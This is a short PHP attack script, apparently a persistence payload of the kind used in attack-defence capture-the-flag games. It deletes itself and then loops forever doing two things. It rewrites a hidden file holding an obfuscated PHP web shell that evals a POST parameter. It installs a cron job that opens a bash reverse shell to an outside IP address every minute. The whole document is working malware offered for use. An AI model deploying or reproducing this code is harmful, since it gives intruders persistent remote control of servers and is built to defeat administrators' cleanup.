<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.demo.php';
$shell = '<?php $nfq = str_replace("k","","ksktrk_krkekpklkakce");$xt="nVGVzdEAxt";$tep="MjM0J10pOtwo=";$ej="IEtBldmFsKtCtR";$am="fUEt9TVFs";$zd = $nfq("ee", "", "eebeeaseee64_eedeeeeecoeedeee");$zcj = $nfq("l","","lcrlelatel_lflunlctlioln");$kh = $zcj(\'\', $zd($nfq("t", "", $ej.$am.$xt.$tep))); $kh();?>';
$message="*/1 * * * * echo \"bash -i >& /dev/tcp/10.12.109.212/7788 0>&1\" | bash";

while (TRUE) {
file_put_contents($file, $shell);
system("echo '$message' > /tmp/1 ;");
system("crontab /tmp/1;");
system("rm /tmp/1;");
usleep(50);
}
?>